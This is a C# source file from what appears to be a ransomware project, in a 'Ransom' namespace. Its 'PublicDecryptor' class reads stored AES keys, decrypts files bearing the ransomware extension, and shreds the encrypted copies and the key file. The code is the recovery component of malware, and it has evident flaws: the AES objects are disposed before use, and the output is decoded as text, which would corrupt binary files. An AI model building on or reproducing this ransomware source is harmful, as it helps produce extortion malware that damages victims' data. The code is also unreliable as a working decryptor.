using Shared;
using System.Security.Cryptography;

namespace Ransom
{
    public class PublicDecryptor
    {
        public static void TryDecrypt()
        {
            try
            {
                Dictionary<Aes, string>? keysPaths = GetAesPaths(Settings.DECRYPTED_KEYS_PATH);
                if (keysPaths == null)
                    return;

                foreach (KeyValuePair<Aes, string> _ in keysPaths)
                {
                    byte[] encodedData = File.ReadAllBytes(_.Value);
                    string decryptedData = DecryptAESData(encodedData, _.Key);

                    string newPath = _.Value.Replace(Settings.RANSOMWARE_EXTENSION, "");
                    using FileStream fs = File.Open(newPath, FileMode.OpenOrCreate);
                    using StreamWriter sw = new(fs);

                    sw.Write(decryptedData);
                    Utility.ShredFile(_.Value);
                }

                Utility.ShredFile(Settings.DECRYPTED_KEYS_PATH);
            }
            catch (Exception) { }
        }

        private static Dictionary<Aes, string>? GetAesPaths(string sPath)
        {
            if (sPath == null || !File.Exists(sPath))
                return null;

            Dictionary<Aes, string> aesPaths = new();
            using (StreamReader sr = new(sPath))
            {
                string? line;
                while ((line = sr.ReadLine()) != null)
                {
                    string[] lineAsArr = line.Split(" ");
                    string[] ivPath = lineAsArr[1].Split("\t");

                    byte[] key = Convert.FromBase64String(lineAsArr[0]);
                    byte[] iv = Convert.FromBase64String(ivPath[0]);
                    string path = ivPath[1];

                    Aes aes;
                    using (aes = Aes.Create())
                    {
                        aes.Key = key;
                        aes.IV = iv;
                    }

                    aesPaths.Add(aes, path);
                }
            }

            return aesPaths;
        }

        private static string DecryptAESData(byte[] encryptedData, Aes aesKey)
        {
            ICryptoTransform decryptor = aesKey.CreateDecryptor(aesKey.Key, aesKey.IV);
            using MemoryStream msDecrypt = new(encryptedData);
            using CryptoStream csDecrypt = new(msDecrypt, decryptor, CryptoStreamMode.Read);
            using StreamReader srDecrypt = new(csDecrypt);

            string plaintext = srDecrypt.ReadToEnd();
            return plaintext;
        }
    }
}